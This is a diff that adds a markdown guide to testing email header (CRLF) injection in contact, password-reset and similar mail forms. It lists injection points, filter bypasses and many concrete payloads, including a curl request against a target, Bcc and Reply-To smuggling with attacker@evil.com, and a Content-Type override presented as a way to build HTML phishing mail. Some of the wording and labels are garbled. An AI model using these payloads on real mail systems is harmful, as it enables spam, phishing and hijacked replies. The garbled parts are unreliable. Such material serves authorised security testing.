@@ -1,0 +1,60 @@
+# HOW TO TEST EMAIL HEADER INJECTION ON A TARGET (2026 expert guide)
+> **Author:** MD MAHABUBUR RAHMAN
+CRLF injection into a mail-sending feature (contact form, password reset, support ticket, invite).
+Payloads: see folder lists. Detection here is methodology.
+
+## The N ways to test
+1. Inject newline in body/text fields: submit a value containing %0d%0a and see if your SMTP ends
+   up with injected headers (Bcc:, Cc:, Subject:, Reply-To:).
+2. Inject in subject/name/email fields: those become header values directly.
+3. Multiple headers: Bcc to collect mail; Cc; Reply-To hijack replies; Content-Type override.
+4. Attachment filename injection: filename="...%0d%0aContent-Disposition...".
+5. MIME confusion: set Content-Type to text/html to make your spoof render HTML.
+6. Charset/coding injection: utf-8 and line continuations (\x0d\x0a\x20) evade naive filters.
+7. Blind OOB: have the app email YOUR address, inspect raw headers of delivery.
+8. If you control the psender email param (from field) -> full spoof.
+
+## Step-by-step on target
+1. Find the mail sink (regex: mail(, sendmail, smtp, nodemailer, PHPmailer). Usually in password reset, contact, form.
+2. Send NORMAL request to yourself. Then:
+   subject field -> subject%0d%0aBcc:%20pwn@yourinbox.com
+   message field -> %0d%0aReply-To:%20attacker@evil.com
+3. Check the received email RAW headers (show original) for the extra header line.
+4. If injection works add: %0d%0aContent-Type:%20text/html%0d%0a%0d%0a<img src=https://reflected-<yourid>-... > 
+5. Position matters: header injection needs the CRLF BEFORE the body (headers then blank line).
+
+## Bypass ladder
+- %0d%0a (%0D%0A as well), \r\n literal, \r (bare CR = RFC 5322 folding line), unicode U+2028? no - stick to CRLF.
+- Double-encode %250d%250a after a decoder (PHP stripslashes? no strip).
+- Multiline via \x20 line continuation (obs-fold) to sneak filter:  Bcc:...  twice.
+
+## False positives
+- An added header in the delivered mail = real. If nothing changes on resend = you just wrote a literal string.
+- SMTP servers drop multiple From/Date; Bcc/Reply-To/Cc survive = report those.
+
+## Reporting & impact
+- Spam/abuse (email from legit domain), enable phishing per-domain, bypass spam filters (iframe graphics),
+  sometimes mass-mailing high-volume tickets -> DoS mailbox.
+- Severity: Medium. Combine with HTML injection for phishing lures.
+- Tools: Thunder bird "View raw", Burp, email-templates via your own SMTP for OOB.
+
+## WORKED EXAMPLES (concrete)
+A. header injection in the subject (classic):
+```
+curl -i -X POST "https://target.com/contact" -d \
+  "name=Test&email=me@allowed.com&subject=hi%0d%0aBcc:%20me2@allowed.com&message=hello"
+deliver to your test inbox; view RAW: an extra  Bcc: line proves it.
+B. Reply-To hijack via message body:
+message = "thanks%0d%0aReply-To:%20victim-target@example.com%0d%0a"
+(mail client replies go to the attacker field instead)
+C. Content-Type override -> HTML phishing:
+subject = "x%0d%0aContent-Type:%20text/html%0d%0a"
+message = "<img src=x onerror=alert(1)>"  (if HTML mails render, stored/reflected in inbox)
+D. Attachment filename injection:
+filename="resume.pdf%0d%0aContent-Disposition:%20attachment;%20filename='evil.txt'"
+E. Multiple Bcc for mass steed:
+subject = "x%0d%0aBcc:%20a@x.com%0d%0aBcc:%20b@x.com"
+F. Credential-harvest (contact form + collaborator):
+user-value = %0d%0aX-Test:YOUR-COLLABORATOR  (if reflected in headers = OOB confirm)
+G. decode layer test: try the SAME payload URL-encoded (%250d%250a) for a double-decoding stack.
+```
